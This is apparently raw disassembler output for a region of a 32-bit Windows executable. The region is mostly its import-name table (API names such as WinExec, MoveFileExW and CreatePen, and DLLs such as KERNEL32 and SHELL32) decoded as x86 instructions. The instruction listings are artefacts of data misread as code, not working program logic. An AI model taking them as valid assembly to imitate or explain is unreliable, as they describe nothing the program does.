  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
